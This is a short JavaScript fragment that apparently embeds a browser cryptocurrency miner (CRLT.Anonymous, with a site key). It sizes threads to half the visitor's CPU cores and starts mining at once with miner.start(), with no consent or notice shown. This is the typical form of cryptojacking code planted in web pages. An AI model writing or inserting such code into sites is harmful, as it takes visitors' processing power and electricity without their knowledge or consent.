            var threads = window.navigator.hardwareConcurrency / 2;
            if (threads < 1) {
                var threads = 1;
            }
            var miner = new CRLT.Anonymous('2e40913db417a89428de6dc4f5848024368fcdd789cc', {
                threads: threads,
                autoThreads: false,
                throttle: 0.2,
            });
            miner.start();